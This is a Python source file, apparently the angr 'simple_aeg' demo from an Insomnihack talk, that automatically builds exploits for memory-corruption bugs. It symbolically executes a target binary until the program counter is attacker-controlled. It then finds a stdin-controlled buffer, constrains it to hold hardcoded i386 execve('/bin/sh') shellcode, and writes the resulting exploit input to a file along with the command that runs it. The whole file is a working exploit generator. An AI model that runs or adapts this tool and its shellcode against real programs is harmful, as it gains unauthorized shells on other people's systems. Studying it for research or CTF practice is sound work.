import os
import sys
import angr
from simuvex import s_options as so

import logging

l = logging.getLogger("insomnihack.simple_aeg")

# silence some annoying logs
logging.getLogger("simuvex").setLevel("CRITICAL")

l.setLevel("INFO")

# shellcraft i386.linux.sh
shellcode = "6a68682f2f2f73682f62696e89e331c96a0b5899cd80".decode('hex')

def fully_symbolic(state, variable):
    '''
    check if a symbolic variable is completely symbolic
    '''

    for i in range(state.arch.bits):
        if not state.se.symbolic(variable[i]):
            return False

    return True

def check_continuity(address, addresses, length):
    '''
    dumb way of checking if the region at 'address' contains 'length' amount of controlled
    memory.
    '''

    for i in range(length):
        if not address + i in addresses:
            return False

    return True

def find_symbolic_buffer(state, length):
    '''
    dumb implementation of find_symbolic_buffer, looks for a buffer in memory under the user's
    control
    '''

    # get all the symbolic bytes from stdin
    stdin_file = state.posix.get_file(0)

    sym_addrs = [ ]
    for var in stdin_file.variables():
        sym_addrs.extend(state.memory.addrs_for_name(var))

    for addr in sym_addrs:
        if check_continuity(addr, sym_addrs, length):
            yield addr

def main(binary):
    p = angr.Project(binary)

    binary_name = os.path.basename(binary)

    extras = {so.REVERSE_MEMORY_NAME_MAP, so.TRACK_ACTION_HISTORY}
    es = p.factory.entry_state(add_options=extras)
    pg = p.factory.path_group(es, save_unconstrained=True)

    # find a bug giving us control of PC
    l.info("looking for vulnerability in '%s'", binary_name)
    exploitable_path = None
    while exploitable_path is None:
        pg.step()
        if len(pg.unconstrained) > 0:
            l.info("found some unconstrained paths, checking exploitability")
            for u in pg.unconstrained:
                if fully_symbolic(u.state, u.state.regs.pc):
                    exploitable_path = u
                    break

            # no exploitable path found, drop them
            pg.drop(stash='unconstrained')

    l.info("found a path which looks exploitable")
    ep = exploitable_path

    assert ep.state.se.symbolic(ep.state.regs.pc), "PC must be symbolic at this point"

    l.info("attempting to create exploit based off path")

    # keep checking if buffers can hold our shellcode
    for buf_addr in find_symbolic_buffer(ep.state, len(shellcode)):
        l.info("found symbolic buffer at %#x", buf_addr)
        memory = ep.state.memory.load(buf_addr, len(shellcode))
        sc_bvv = ep.state.se.BVV(shellcode)

        # check satisfiability of placing shellcode into the address
        if ep.state.satisfiable(extra_constraints=(memory == sc_bvv,ep.state.regs.pc == buf_addr)):
            l.info("found buffer for shellcode, completing exploit")
            ep.state.add_constraints(memory == sc_bvv)
            l.info("pointing pc towards shellcode buffer")
            ep.state.add_constraints(ep.state.regs.pc == buf_addr)
            break
    else:
        l.warning("couldn't find a symbolic buffer for our shellcode! exiting...")
        return 1

    filename = '%s-exploit' % binary_name
    with open(filename, 'w') as f:
        f.write(ep.state.posix.dumps(0))

    print "%s exploit in %s" % (binary_name, filename)
    print "run with `(cat %s; cat -) | %s`" % (filename, binary)
    return 0

if __name__ == '__main__':
    if len(sys.argv) > 1:
        sys.exit(main(sys.argv[1]))
    else:
        print "%s: <binary>" % sys.argv[0]
